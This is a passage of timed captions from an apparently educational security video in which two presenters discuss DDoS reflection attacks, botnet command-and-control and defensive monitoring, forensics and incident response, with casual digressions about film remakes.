attacks.\n\n331\n00:16:53.440 --> 00:16:57.444\nThe idea here often referred to as spoof\nattacks as well involves the use of\n\n332\n00:16:57.444 --> 00:17:01.709\nmultiple intermediary and secondary\nmachines to bounce attacks off of we jump\n\n333\n00:17:01.709 --> 00:17:06.250\nbetween them and then we ultimately\npropagate them into the primary target.\n\n334\n00:17:06.250 --> 00:17:09.160\nAnd as a result of that we're\nbringing tremendous amounts\n\n335\n00:17:09.160 --> 00:17:11.130\nof firepower to bare by reflecting them,\nright,\n\n336\n00:17:11.130 --> 00:17:14.510\nand essentially lining them up\nto be able to hit these systems.\n\n337\n00:17:14.510 --> 00:17:17.610\nSo, wanna be aware of that, and\njust think about this kind of concern.\n\n338\n00:17:17.610 --> 00:17:20.510\nYour botnets, we've talked about\nbotnets and how important they are.\n\n339\n00:17:20.510 --> 00:17:24.430\nRemember a BOD is essentially a piece of\nsoftware that is used to zombie a machine\n\n340\n00:17:24.430 --> 00:17:25.540\nor take it over.\n\n341\n00:17:25.540 --> 00:17:26.363\nThink of it as Malware.\n\n342\n00:17:26.363 --> 00:17:27.530\nIt's a form of Malware.\n\n343\n00:17:27.530 --> 00:17:32.242\nIf we get a bot, some sort of Malware bot\non our system it's usually a remote portal\n\n344\n00:17:32.242 --> 00:17:37.044\nin a command and control solution where\nthis thing has to call home, essentially.\n\n345\n00:17:37.044 --> 00:17:41.185\nAnd so what we would often wanna do is run\nport-scanning software to see evidence of\n\n346\n00:17:41.185 --> 00:17:43.765\nthat and understand that that's happening.\n\n347\n00:17:43.765 --> 00:17:46.818\nIf we see random and\nopened ports that don't look right or\n\n348\n00:17:46.818 --> 00:17:50.508\ntraffic that is on-again,\noff-again to a specific set of ports but\n\n349\n00:17:50.508 --> 00:17:54.580\nis seemingly happening with some sort\nof relative pattern or specificity,\n\n350\n00:17:54.580 --> 00:17:57.981\nwe often can detect that this\nkind of activity is taking place.\n\n351\n00:17:57.981 --> 00:18:01.291\nIt's surprising, we talked about\nthis with promiscuous mode.\n\n352\n00:18:01.291 --> 00:18:04.210\nYou know the prom, PRM or whatever it was.\n\n353\n00:18:04.210 --> 00:18:04.713\n&gt;&gt; Prom query.\n\n354\n00:18:04.713 --> 00:18:05.310\n&gt;&gt; Prom query, there you go, yeah.\n\n355\n00:18:05.310 --> 00:18:06.360\nThe prom query.\n\n356\n00:18:06.360 --> 00:18:07.791\nI kept thinking prom queen in my head.\n\n357\n00:18:07.791 --> 00:18:09.149\nAnd I couldn't say that.\n\n358\n00:18:09.149 --> 00:18:11.750\nCan't use a prom queen to\nfind promiscuous mode cards.\n\n359\n00:18:11.750 --> 00:18:15.050\nBut you know, the Prom query\nsoftware that we talked about.\n\n360\n00:18:15.050 --> 00:18:16.930\nThat would just be too bizarre for\nwords right?\n\n361\n00:18:16.930 --> 00:18:18.700\nOkay I want you to wear this thing.\n\n362\n00:18:18.700 --> 00:18:19.940\nIt's got all the antennas on it.\n\n363\n00:18:19.940 --> 00:18:21.330\nWalk around in a circle.\n\n364\n00:18:21.330 --> 00:18:24.260\nWhenever it beeps, I want you to stop and\nthrow a little sticker down on the ground.\n\n365\n00:18:24.260 --> 00:18:27.045\nRight?\nSo, we use the ProM query software that we\n\n366\n00:18:27.045 --> 00:18:31.628\ndemoed in the hacking, or in the sniffing\nepisode that we did in the hands on,\n\n367\n00:18:31.628 --> 00:18:35.929\nwhere we took a look at how to see that\npromiscuous mode is running in one or\n\n368\n00:18:35.929 --> 00:18:37.110\nmore systems.\n\n369\n00:18:37.110 --> 00:18:40.400\nThe idea would be that we could tell\nthat we have suspicious behavior.\n\n370\n00:18:40.400 --> 00:18:43.320\nAnd we talked about the fact\nthat one of the best defenses\n\n371\n00:18:43.320 --> 00:18:46.450\nwe have against this kind of stuff\nis just eyes wide open monitoring.\n\n372\n00:18:46.450 --> 00:18:49.870\nRight and I've made I made the case\nmany times in a lot of our episodes that\n\n373\n00:18:49.870 --> 00:18:52.550\nwe spend a lot of time\nmonitoring looking one way.\n\n374\n00:18:52.550 --> 00:18:54.860\nWe don't spend enough time\nmonitoring looking the other way.\n\n375\n00:18:54.860 --> 00:18:59.020\nWe need to split our focus and become\nbi-directional in our capability and\n\n376\n00:18:59.020 --> 00:19:03.330\nour focus in our area of management\nto truly see what's happening.\n\n377\n00:19:03.330 --> 00:19:07.208\nAnd on key systems, on picket line\nsystems, on your point of interest systems\n\n378\n00:19:07.208 --> 00:19:11.204\nthat are gonna be valuable to hackers and\nfor whatever reason if it's a file sever\n\n379\n00:19:11.204 --> 00:19:14.539\nor if it's a web server or\nmail server whatever it is, a database.\n\n380\n00:19:14.539 --> 00:19:18.897\nWe should be running local agents to\nmonitor for all this kind of stuff as well\n\n381\n00:19:18.897 --> 00:19:23.120\nas centrally aggregating this data up\ninto systems that can dashboard and\n\n382\n00:19:23.120 --> 00:19:24.430\nalert like IPSS.\n\n383\n00:19:24.430 --> 00:19:27.500\nSo we may use network based and\nhost based solutions there but\n\n384\n00:19:27.500 --> 00:19:31.140\nwe should be running local software\non these systems separate from\n\n385\n00:19:31.140 --> 00:19:34.760\nsomething like an IPS as\nan additional layer of protection.\n\n386\n00:19:34.760 --> 00:19:37.880\nWe talk a lot about hardening systems,\nabout stripping out services,\n\n387\n00:19:37.880 --> 00:19:39.448\ngetting rid of unwanted software.\n\n388\n00:19:39.448 --> 00:19:41.448\nYou know people sometimes go\nto one extreme and say, well,\n\n389\n00:19:41.448 --> 00:19:43.610\nI shouldn't run anything on\nthe local box then, right.\n\n390\n00:19:43.610 --> 00:19:47.010\nI should only run like the bare\nminimum and maybe an IDS or\n\n391\n00:19:47.010 --> 00:19:48.710\nIPSage but nothing else.\n\n392\n00:19:48.710 --> 00:19:51.000\nWell, yeah in one respect sure I get that.\n\n393\n00:19:51.000 --> 00:19:54.430\nBut what you need to do is understand\nthat there are certain kinds of software\n\n394\n00:19:54.430 --> 00:19:57.630\nthat you can run that are good and\ncertain kinds that are bad.\n\n395\n00:19:57.630 --> 00:20:01.090\nSo we don't wanna run streamy media\napplications on that server but\n\n396\n00:20:01.090 --> 00:20:06.350\nwe may want to go in to run a monitoring\nprogram locally that we can check it on.\n\n397\n00:20:06.350 --> 00:20:08.367\nAnd validate that we don't\nhave any unusual activity.\n\n398\n00:20:08.367 --> 00:20:11.050\nAnd that would be a good kind\nof software to run locally.\n\n399\n00:20:11.050 --> 00:20:13.079\nSo, a lot of times I have\nthis conversation and\n\n400\n00:20:13.079 --> 00:20:14.438\npeople are a little confused.\n\n401\n00:20:14.438 --> 00:20:18.815\nIt's about creating a protection profile\nfor the box, a baseline if you will,\n\n402\n00:20:18.815 --> 00:20:23.191\nthat allows for the application of common\nsense, but also the use of continuous\n\n403\n00:20:23.191 --> 00:20:27.630\nmonitoring file processes to ensure\nthe safety and security of the box.\n\n404\n00:20:27.630 --> 00:20:29.950\nAnd this is a bit of a different approach.\n\n405\n00:20:29.950 --> 00:20:31.360\nAs we've talked about.\n\n406\n00:20:31.360 --> 00:20:35.810\nThen what you may hear normally from us or\nfrom me or Mike,\n\n407\n00:20:35.810 --> 00:20:39.380\nor anybody who you hear talk about this\nstuff, unless we really sit down and\n\n408\n00:20:39.380 --> 00:20:41.990\ndifferentiate and\nreally distinguish what we mean.\n\n409\n00:20:41.990 --> 00:20:44.060\nBecause we very generically,\nas a blanket statement,\n\n410\n00:20:44.060 --> 00:20:45.320\nkinda say, yeah just strip everything out.\n\n411\n00:20:45.320 --> 00:20:46.740\nThat's how you harden a box.\n\n412\n00:20:46.740 --> 00:20:48.470\nBut it's not throwing out everything.\n\n413\n00:20:48.470 --> 00:20:51.080\nIt's getting rid of the bad\nstuff that distracts us, but\n\n414\n00:20:51.080 --> 00:20:53.200\nkeeping the good stuff that\nactually helps to focus us.\n\n415\n00:20:53.200 --> 00:20:55.440\nAnd that is a refinement of\nthe methodology, I think,\n\n416\n00:20:55.440 --> 00:20:57.760\nthat's worth mentioning and\nworth discussing.\n\n417\n00:20:57.760 --> 00:21:01.068\nAlthough I could also just be talking\nout the left side of my face, and\n\n418\n00:21:01.068 --> 00:21:03.133\nnot know what the heck I'm talking about.\n\n419\n00:21:03.133 --> 00:21:04.485\nTake that with a grain of salt.\n\n420\n00:21:04.485 --> 00:21:06.480\nBut I'm only kidding,\nthat is actually good advice.\n\n421\n00:21:06.480 --> 00:21:08.450\nIt's really good to think\nabout it to understand.\n\n422\n00:21:08.450 --> 00:21:11.170\nKeep in mind also that botnets\nrequire a set command and\n\n423\n00:21:11.170 --> 00:21:15.310\ncontrol which means they require\nexternal access to phone home, right?\n\n424\n00:21:15.310 --> 00:21:17.568\nThis is the you know, the ET construct.\n\n425\n00:21:17.568 --> 00:21:21.474\nWe want to phone home and so if we can\nblock those communication pathways,\n\n426\n00:21:21.474 --> 00:21:23.616\nthose convert channels as we call them,\n\n427\n00:21:23.616 --> 00:21:26.829\nwe may be successful at not\npreventing the attack totally but\n\n428\n00:21:26.829 --> 00:21:31.360\nforestalling it long enough to understand\nthat, you know, there is a problem.\n\n429\n00:21:31.360 --> 00:21:35.030\nSo remember the minute those systems\ncan reach out beyond the border,\n\n430\n00:21:35.030 --> 00:21:39.120\nget out beyond the gateway or whatever\nis preventing them from going out and\n\n431\n00:21:39.120 --> 00:21:40.010\ncommunicating.\n\n432\n00:21:40.010 --> 00:21:43.815\nThey will essentially pop up on the radar\nof the bot master or the bot herder.\n\n433\n00:21:43.815 --> 00:21:47.371\nAnd the bot herder is the bad actor\nthat is controlling the bots, right?\n\n434\n00:21:47.371 --> 00:21:48.910\nRemember Ghostbusters, the original one?\n\n435\n00:21:48.910 --> 00:21:49.511\n&gt;&gt; I do.\n\n436\n00:21:49.511 --> 00:21:51.410\nYes.\n&gt;&gt; Not that ridiculous remake they made,\n\n437\n00:21:51.410 --> 00:21:53.516\nbut you know the actual good movie,\nright, the real one.\n\n438\n00:21:53.516 --> 00:21:54.217\n&gt;&gt; It had the Key Master.\n\n439\n00:21:54.217 --> 00:21:55.010\n&gt;&gt; The Gozer.\n\n440\n00:21:55.010 --> 00:21:56.655\nGozer the Gozarian, and\nthe Key Master, right?\n\n441\n00:21:56.655 --> 00:21:57.692\nWho are you?\nI'm the Key master, right?\n\n442\n00:21:57.692 --> 00:22:02.253\nSo you gotta think about the fact that if\nwe can identify that that has occurred,\n\n443\n00:22:02.253 --> 00:22:04.380\nwe are gonna see a coming wave right.\n\n444\n00:22:04.380 --> 00:22:06.800\nIf we know that they were\nsuccessful at calling home\n\n445\n00:22:06.800 --> 00:22:10.450\nright which is the premise of every\nalien invasion movie we've ever seen.\n\n446\n00:22:10.450 --> 00:22:13.841\nAnother ridiculous one that remake of\nindependence day another, stupid movie\n\n447\n00:22:13.841 --> 00:22:17.242\nthat they, great first movie but they\nremade it just, what are they thinking?\n\n448\n00:22:17.242 --> 00:22:17.853\n&gt;&gt; Why?\nWhy?\n\n449\n00:22:17.853 --> 00:22:18.363\n&gt;&gt; I'll tell you why,\n\n450\n00:22:18.363 --> 00:22:20.237\nbecause there's absolutely no original\nideas in Hollywood these days.\n\n451\n00:22:20.237 --> 00:22:22.230\nThat's why.\nRight?\n\n452\n00:22:22.230 --> 00:22:23.210\nYeah, they remade Ben Hur.\n\n453\n00:22:23.210 --> 00:22:24.180\nAnother total flop.\n\n454\n00:22:24.180 --> 00:22:25.490\nI mean, a masterpiece.\n\n455\n00:22:25.490 --> 00:22:28.910\nYou probably could not have picked\na finer movie when it was made originally\n\n456\n00:22:28.910 --> 00:22:31.810\ncinemagraphically, one of the best\nmovies of all times, right?\n\n457\n00:22:31.810 --> 00:22:32.600\nI mean, just classic.\n\n458\n00:22:32.600 --> 00:22:35.370\nAnd they remake it, and it's just\napparently it's the worst thing ever.\n\n459\n00:22:35.370 --> 00:22:36.700\n&gt;&gt; Yeah, no I won't bother seeing it.\n\n460\n00:22:36.700 --> 00:22:38.002\n&gt;&gt; Yeah, well.\n\n461\n00:22:38.002 --> 00:22:38.776\nJust, whatever.\n\n462\n00:22:38.776 --> 00:22:40.010\nThat's because we have work to do.\n\n463\n00:22:40.010 --> 00:22:43.970\nWe should be here talking about how to\nkeep the networks and stuff secure,\n\n464\n00:22:43.970 --> 00:22:47.340\nnot going out the movies and pretending\nto like things that are not worthwhile.\n\n465\n00:22:47.340 --> 00:22:49.840\nSo we're just going to keep talking\nabout stuff that is important.\n\n466\n00:22:49.840 --> 00:22:51.190\nSo make sure you pay attention.\n\n467\n00:22:51.190 --> 00:22:52.080\nSo bot nets, right?\n\n468\n00:22:52.080 --> 00:22:52.840\nTalking about bot nets.\n\n469\n00:22:52.840 --> 00:22:56.680\nWhat I was suggesting is you know,\nwhen you see activity that does allow them\n\n470\n00:22:56.680 --> 00:22:59.440\nto call home this should be a red flag,\na warning sign for you, right?\n\n471\n00:22:59.440 --> 00:23:02.670\nYou should be thinking that number one,\nI've got a concern.\n\n472\n00:23:02.670 --> 00:23:04.430\nI've gotta go figure out where\nthe malware is and get rid of it.\n\n473\n00:23:04.430 --> 00:23:08.230\nBut I need to start blocking those\nports and or I need to prepare for\n\n474\n00:23:08.230 --> 00:23:11.450\nthe fact that i'm probably gonna be\nthe recipient of some very nasty inbound\n\n475\n00:23:11.450 --> 00:23:13.310\ntraffic that I don't want.\n\n476\n00:23:13.310 --> 00:23:15.740\nChecking fire wall logs\nis one of the key ways or\n\n477\n00:23:15.740 --> 00:23:20.040\nIDSS IPSS the external gateway\nborder defense mechanisms.\n\n478\n00:23:20.040 --> 00:23:22.300\nThis is where the traffic comes and\ngoes right?\n\n479\n00:23:22.300 --> 00:23:25.050\nAnd this is where we see\nevidence of traffic transiting.\n\n480\n00:23:25.050 --> 00:23:26.910\nAnd if we see this information coming and\n\n481\n00:23:26.910 --> 00:23:30.830\ngoing, this is where we find evidence\nof the fact that we may have a problem.\n\n482\n00:23:30.830 --> 00:23:31.750\nBut think about this.\n\n483\n00:23:31.750 --> 00:23:34.573\nHow many of us actually have the time\nproactively to go through those devices,\n\n484\n00:23:34.573 --> 00:23:36.433\nlooking at those logs and\nunderstand what it says?\n\n485\n00:23:36.433 --> 00:23:37.930\n&gt;&gt; Cuz the logs are so small there's\nvery little information in there.\n\n486\n00:23:37.930 --> 00:23:41.169\nNo, hours and there you go.\n\n487\n00:23:41.169 --> 00:23:42.966\n[LAUGH]\n&gt;&gt; Yes,\n\n488\n00:23:42.966 --> 00:23:45.589\nwe have all that kind of time, right?\n\n489\n00:23:45.589 --> 00:23:48.977\nYou raised an excellent point which is\nthe reality is we talk about this and\n\n490\n00:23:48.977 --> 00:23:52.639\nhow important this is but we know that we\nalmost never go look at these logs unless\n\n491\n00:23:52.639 --> 00:23:56.081\nwe do it reactively after the fact\nbecause it is very difficult, there is so\n\n492\n00:23:56.081 --> 00:23:57.037\nmuch information.\n\n493\n00:23:57.037 --> 00:23:59.230\nIt is overwhelming and can be a problem.\n\n494\n00:23:59.230 --> 00:24:02.447\nYet, if we can figure out a way,\nand SEM to a certain advantage, or\n\n495\n00:24:02.447 --> 00:24:06.380\nSIM depending on where you come from and\nhow you prefer to pronounce things.\n\n496\n00:24:06.380 --> 00:24:10.410\nBut if we use the security information\nevent management system, right,\n\n497\n00:24:10.410 --> 00:24:14.360\nto be able to go in and aggregate these\nlogs up and look at the them centrally and\n\n498\n00:24:14.360 --> 00:24:19.280\nuse depacket analytics, BI and data\nvisualization to be able to chart, and\n\n499\n00:24:19.280 --> 00:24:23.460\ngraph, and essentially scoreboard, right,\nall this stuff, put it up on a dashboard,\n\n500\n00:24:23.460 --> 00:24:26.500\nwe can certainly be alerted to\nthe fact this stuff is happening.\n\n501\n00:24:26.500 --> 00:24:29.960\nBut we have to know enough about the fact\nthat we may have issues that we program in\n\n502\n00:24:29.960 --> 00:24:32.060\nthe filters, essentially,\nto find this stuff.\n\n503\n00:24:32.060 --> 00:24:34.630\nSo, again, it'something to consider and\nto think about.\n\n504\n00:24:34.630 --> 00:24:37.810\nBut we do wanna understand that\nit takes more than one bot to\n\n505\n00:24:37.810 --> 00:24:40.660\nbe able to attack a system and\ndistribute an analysis service attack.\n\n506\n00:24:40.660 --> 00:24:41.980\nWe need a whole bot army.\n\n507\n00:24:41.980 --> 00:24:45.750\nAnd bot armies have to be fashioned or\nmade, just like anything else.\n\n508\n00:24:45.750 --> 00:24:50.310\nRemember, was it the Clone Wars, which one\nwas it in the Star Wars trilogy where they\n\n509\n00:24:50.310 --> 00:24:52.840\ngo out and\nthey create the clone army, right?\n\n510\n00:24:52.840 --> 00:24:54.690\n&gt;&gt; Yes, uh-huh.\nYoung Ben Kenobi goes and sees Boba Fett,\n\n511\n00:24:54.690 --> 00:24:57.680\nand he ultimately realizes all the clones,\nthat whole thing?\n\n512\n00:24:57.680 --> 00:25:01.360\nSo you build the clone army,\nyou build the bot army in secret, right?\n\n513\n00:25:01.360 --> 00:25:02.950\nAs I said today,\nyou don't have to go out and\n\n514\n00:25:02.950 --> 00:25:06.570\ntake over a bunch of machines\nunless you wanna be on the inside.\n\n515\n00:25:06.570 --> 00:25:09.395\nYou literally can just do this by\nbuilding your own army in secret and\n\n516\n00:25:09.395 --> 00:25:12.880\nthen just simply unleashing them\non the world when you're ready for\n\n517\n00:25:12.880 --> 00:25:14.930\n30 bucks an hour and\na cup of coffee or whatever it maybe.\n\n518\n00:25:14.930 --> 00:25:17.280\nSo, you just wanna think about that and\nbe aware of that, but\n\n519\n00:25:17.280 --> 00:25:19.650\nthat is something more and\nmore today that we're seeing.\n\n520\n00:25:19.650 --> 00:25:22.450\nSo it is something to consider,\nrandom scanning,\n\n521\n00:25:22.450 --> 00:25:26.780\nwe'll pick up on this if we're looking for\nthis kind of behavior.\n\n522\n00:25:26.780 --> 00:25:29.870\nBut, remember, these communication\npathways are gonna pop up and\n\n523\n00:25:29.870 --> 00:25:31.755\ngo away at random intervals and\nrandom times.\n\n524\n00:25:31.755 --> 00:25:35.950\nWe wanna look for unusual behavior,\nlook for local subnet scams, look for\n\n525\n00:25:35.950 --> 00:25:38.120\nscams that are unusual on the subnet.\n\n526\n00:25:38.120 --> 00:25:44.885\nLook for scams that are walking through\nvarious pathways that are permeating or\n\n527\n00:25:44.885 --> 00:25:47.695\npermutating through, so,\nin other words, they are stepping\n\n528\n00:25:47.695 --> 00:25:52.105\nthrough a port list per machine,\nscanning traffic looking for responses.\n\n529\n00:25:52.105 --> 00:25:55.785\nAll this kind of stuff is potentially\nevidence of the fact that there may be\n\n530\n00:25:55.785 --> 00:25:59.905\nbots and there may be activity going\non that we don't want to actually see.\n\n531\n00:25:59.905 --> 00:26:02.165\nRemember, malicious code\npropagates in all sorts of ways.\n\n532\n00:26:02.165 --> 00:26:04.075\nWe talked about worms self-replicating.\n\n533\n00:26:04.075 --> 00:26:06.875\nWe talked about viruses being\nspread through a variety of helpful\n\n534\n00:26:06.875 --> 00:26:09.290\nhand mechanisms where we move them around.\n\n535\n00:26:09.290 --> 00:26:13.530\nRansomware, malware, in general\nthe ransomware, in particular, adware,\n\n536\n00:26:13.530 --> 00:26:19.150\nspyware, crypters, all sorts of stuff,\nbot software, rootkit.\n\n537\n00:26:19.150 --> 00:26:23.080\nAll this stuff can be downloaded through\neither a drive-by attack or a propagation\n\n538\n00:26:23.080 --> 00:26:27.190\nattack, where you see something and then\nit essentially attaches to your machine.\n\n539\n00:26:27.190 --> 00:26:29.278\nIf you connect to a website\nthrough a redirection,\n\n540\n00:26:29.278 --> 00:26:32.745\nyou never know what's gonna happen and you\nnever know where malware will come from.\n\n541\n00:26:32.745 --> 00:26:36.560\nSo there's all sorts of stuff out there\nthat we would have to be concerned with\n\n542\n00:26:36.560 --> 00:26:39.590\nand really think about because there\nis quite a bit, unfortunately,\n\n543\n00:26:39.590 --> 00:26:43.280\nof stuff that can lead to concerns, right.\n\n544\n00:26:43.280 --> 00:26:47.380\nThere are many, many stories about DOS and\n\n545\n00:26:47.380 --> 00:26:50.610\nDDOS attack systems that\nhave been unleashed.\n\n546\n00:26:50.610 --> 00:26:53.960\nI've seen it with a lot of my clients,\nseen it with a lot of customers.\n\n547\n00:26:53.960 --> 00:26:57.540\nThere are Android, as well as Apple,\nas well as Microsoft-based or\n\n548\n00:26:57.540 --> 00:26:59.150\nWindows- based tools for this.\n\n549\n00:26:59.150 --> 00:27:00.760\nNobody is immune today.\n\n550\n00:27:00.760 --> 00:27:02.280\nEverybody is, essentially,\n\n551\n00:27:02.280 --> 00:27:06.180\nseeing these kinds of concerns\npropagate on their network.\n\n552\n00:27:06.180 --> 00:27:09.570\nWe wanna think about the fact that we\ncan profile this kind of activity as I\n\n553\n00:27:09.570 --> 00:27:12.130\nmentioned and look for the warning signs.\n\n554\n00:27:12.130 --> 00:27:15.720\nWe may wanna be scanning and looking,\nas we said, at not just traffic and\n\n555\n00:27:15.720 --> 00:27:18.840\nnot just behavior and not just logs,\nbut also think about this.\n\n556\n00:27:18.840 --> 00:27:21.590\nA lot of times machines will\nget infected with malware, and\n\n557\n00:27:21.590 --> 00:27:22.940\nwhat is our typical response?\n\n558\n00:27:22.940 --> 00:27:26.200\nWe find out something has happened,\nright, and so IT is alerted,\n\n559\n00:27:26.200 --> 00:27:28.348\nthey come in, they'll do a quick analyses.\n\n560\n00:27:28.348 --> 00:27:30.930\nThey'll say, okay,\nbasically we have not time or no energy or\n\n561\n00:27:30.930 --> 00:27:32.270\nno compunction to deal with this.\n\n562\n00:27:32.270 --> 00:27:34.650\nWe're not going to isolate it and\nforensically examine the machine.\n\n563\n00:27:34.650 --> 00:27:35.947\nWe're just simply gonna blow it out,\nright.\n\n564\n00:27:35.947 --> 00:27:37.246\n&gt;&gt; Yeah, yeah.\n\n565\n00:27:37.246 --> 00:27:41.830\n&gt;&gt; Which is a valid response,\ndon't get me wrong.\n\n566\n00:27:41.830 --> 00:27:44.890\nEradicating the system by nuking it,\nessentially, and\n\n567\n00:27:44.890 --> 00:27:47.210\nstarting over does get rid of the malware.\n\n568\n00:27:47.210 --> 00:27:48.082\nBut here's the problem.\n\n569\n00:27:48.082 --> 00:27:50.000\nIf you don't understand the attack vector,\n\n570\n00:27:50.000 --> 00:27:52.860\nif you don't know how the malware got in\nthere, we don't have any idea of how to,\n\n571\n00:27:52.860 --> 00:27:54.480\nthen, defend against it\nwhen it happens again.\n\n572\n00:27:54.480 --> 00:27:58.330\nBecause if it happened once, chances are\ngood it's happening more than once, and\n\n573\n00:27:58.330 --> 00:28:01.250\nwe're just not understanding\nthat that is the case.\n\n574\n00:28:01.250 --> 00:28:03.810\nAnd so while I like the idea that\nwe start clean, don't get me wrong,\n\n575\n00:28:03.810 --> 00:28:08.250\nbecause it's very definitive that we don't\nhave a problem as long as our images\n\n576\n00:28:08.250 --> 00:28:10.910\nare protected, we know that that image,\nthat baseline is good.\n\n577\n00:28:10.910 --> 00:28:14.030\nNow, there is a counterargument there\nwhich is if the baseline is infected,\n\n578\n00:28:14.030 --> 00:28:16.040\nwe're essentially just kicking\nthe can down the road.\n\n579\n00:28:16.040 --> 00:28:19.090\nIf the baseline, itself, has the weakness\nthen obviously that's an issue.\n\n580\n00:28:19.090 --> 00:28:21.270\nBut if we don't investigate,\ndo instant response and\n\n581\n00:28:21.270 --> 00:28:24.820\nforensically examine the pattern\nof behavior we're seeing,\n\n582\n00:28:24.820 --> 00:28:28.030\nwe may not realize where the attack vector\nlies, and we may not realize that we\n\n583\n00:28:28.030 --> 00:28:32.080\nare actually potentially propagating that\nattack as opposed to defending against it.\n\n584\n00:28:32.080 --> 00:28:34.360\nAnd this is something else to consider.\n\n585\n00:28:34.360 --> 00:28:38.555\nWe wanna think about isolating traffic,\nfiltering it, identifying the traffic and\n\n586\n00:28:38.555 --> 00:28:40.958\nscanning to understand\nwhat's going on there.\n\n587\n00:28:40.958 --> 00:28:43.643\nWe've shown you examples of\nvarious scanning tools before.\n\n588\n00:28:43.643 --> 00:28:46.266\nAnd we wanna be clear and\nunequivocal about this,\n\n589\n00:28:46.266 --> 00:28:49.825\nthat I believe a layered approach\nwhere we scan at the endpoint, and\n\n590\n00:28:49.825 --> 00:28:53.885\nwe scan on the network and we scan at\nthe gateway is much, much better than just\n\n591\n00:28:53.885 --> 00:28:57.571\ntrusting the providence and\nscanning in only one of those locations,\n\n592\n00:28:57.571 --> 00:29:02.110\ntypically at the gateway, and perhaps not\nscanning in multiple locations, right.\n\n593\n00:29:02.110 --> 00:29:06.500\nYou could absorb the attack as a DLS or\nDDOS counter-measure.\n\n594\n00:29:06.500 --> 00:29:08.956\nIs that all you got, right, bring it on,\nkinda the Rocky approach, right?\n\n595\n00:29:08.956 --> 00:29:09.508\n&gt;&gt; [LAUGH]\n&gt;&gt; Come on,\n\n596\n00:29:09.508 --> 00:29:11.140\nyou can hit me harder than that, right?\n\n597\n00:29:11.140 --> 00:29:13.523\nBut the reality is you can only absorb so\nmuch, right.\n\n598\n00:29:13.523 --> 00:29:14.686\nLike the sea in Star Trek,\n\n599\n00:29:14.686 --> 00:29:18.650\nright, our shields are down to 20%,\nand we can't absorb one more attack.\n\n600\n00:29:18.650 --> 00:29:21.820\nWe may be able to see degradation\nof services occurring little by\n\n601\n00:29:21.820 --> 00:29:22.740\nlittle incrementally, and\n\n602\n00:29:22.740 --> 00:29:25.790\nif we absorb enough attacks,\nwe may actually get knocked offline.\n\n603\n00:29:25.790 --> 00:29:28.440\nWe can't shut down the service,\nand so just,\n\n604\n00:29:28.440 --> 00:29:33.440\nessentially, kill the inbound traffic\nto the service by shutting it off.\n\n605\n00:29:33.440 --> 00:29:35.260\nAnd then that traffic has nowhere to go.\n\n606\n00:29:35.260 --> 00:29:37.119\nNow, it may be unrealistic to say, well,\n\n607\n00:29:37.119 --> 00:29:40.660\nwe'll just shut off email because a lot\nof people need that, and I get that.\n\n608\n00:29:40.660 --> 00:29:44.970\nBut the reality is I'd rather kill email\nfor an hour than worry about disinfecting\n\n609\n00:29:44.970 --> 00:29:47.610\nmy entire network, or perhaps\nhaving to reboot my entire network,\n\n610\n00:29:47.610 --> 00:29:51.390\nright, which can be a bit of a challenge\ndepending on what we're talking about.\n\n611\n00:29:51.390 --> 00:29:52.840\nSo we wanna think about that.\n\n612\n00:29:52.840 --> 00:29:55.632\nWe have to think about the propagation\neffect, the butterfly or\n\n613\n00:29:55.632 --> 00:29:58.880\nripple effect of these attacks\non secondary, tertiary networks.\n\n614\n00:29:58.880 --> 00:30:00.810\nIf we have partner networks\nconnected to us, and\n\n615\n00:30:00.810 --> 00:30:04.280\nwe were connected to them, this can\nlead to compromise and be a problem.\n\n616\n00:30:04.280 --> 00:30:05.320\nSo we wanna think about that.\n\n617\n00:30:06.356 --> 00:30:09.880\nWe wanna try to neutralize the handlers\nif possible, figure out where the bot\n\n618\n00:30:09.880 --> 00:30:14.740\nherders and the trollers are, cut them off\nif at all possible, prevent any attacks.\n\n619\n00:30:14.740 --> 00:30:18.020\nYou're further propagating by trying\nto stop that inbound traffic and\n\n620\n00:30:18.020 --> 00:30:19.020\nfigure out where it is.\n\n621\n00:30:19.020 --> 00:30:22.300\nSo there's a lot of different things we\nhave to consider, but we have to be very\n\n622\n00:30:22.300 --> 00:30:25.750\ncareful here because, as I said,\nthe problem is that we can't go,\n\n623\n00:30:25.750 --> 00:30:30.000\nat least we should not, I'm not saying\nwe can't because people do all the time.\n\n624\n00:30:30.000 --> 00:30:33.900\nBut we should not go out on the offensive\nand try to re-attack the attackers.\n\n625\n00:30:33.900 --> 00:30:36.470\nThere's really just no logic for\nthat, right?\n\n626\n00:30:36.470 --> 00:30:39.190\nI mean, they've got friends that are\nhiding in dark places with big sticks and\n\n627\n00:30:39.190 --> 00:30:41.124\nthey're just gonna come and\nbeat the snot out of you, right?\n\n628\n00:30:41.124 --> 00:30:42.270\n&gt;&gt; [LAUGH]\n&gt;&gt; So you've gotta really be\n\n629\n00:30:42.270 --> 00:30:43.250\ncareful about that.\n\n630\n00:30:43.250 --> 00:30:45.240\nSo it is something to consider, right?\n\n631\n00:30:45.240 --> 00:30:47.810\nSo you just think about the things\nthat can go wrong, I guess,\n\n632\n00:30:47.810 --> 00:30:48.890\nis what I'm suggesting to you.\n\n633\n00:30:48.890 --> 00:30:52.430\nAnd obviously consider the fact that where\nyou just probably spend your time and\n\n634\n00:30:52.430 --> 00:30:55.390\nenergy is on the post-attack forensics,\nas we talked about.\n\n635\n00:30:55.390 --> 00:30:57.590\nIf we don't get the opportunity\nto examine the bots,\n\n636\n00:30:57.590 --> 00:31:00.320\nwe may actually lose the ability to\nunderstand what's happening, and\n\n637\n00:31:00.320 --> 00:31:03.880\nwe're gonna keep seeing this attack\npropagating because we're not stopping it.\n\n638\n00:31:03.880 --> 00:31:07.670\nRoot cause analysis becomes very critical\nhere and we have to understand this.\n\n639\n00:31:07.670 --> 00:31:08.690\nWe have to go in and\n\n640\n00:31:08.690 --> 00:31:11.950\nwe have to potentially create new\nfilters on our gateway devices.\n\n641\n00:31:11.950 --> 00:31:16.795\nWe may have to look at contacting,\nas I said, the IDS, which would be the IP,\n\n642\n00:31:16.795 --> 00:31:21.260\n[LAUGH] the internet service provider,\nISP, I'm thinking IDS, IPS.\n\n643\n00:31:21.260 --> 00:31:22.970\nWe may have to contact the ISP.\n\n644\n00:31:22.970 --> 00:31:25.000\nAnd remember in the cloud,\nif this is happening,\n\n645\n00:31:25.000 --> 00:31:27.960\nwe may have to deal with the cloud\nservice provider, the CSP,\n\n646\n00:31:27.960 --> 00:31:32.940\nbecause the cloud may be the attack vector\nthat is allowing these attacks to occur.\n\n647\n00:31:32.940 --> 00:31:37.130\nAnd we have to understand that, while the\ncloud provider is gonna be front line for\n\n648\n00:31:37.130 --> 00:31:40.834\nthis, they probably have their own\nsystems, their own capabilities 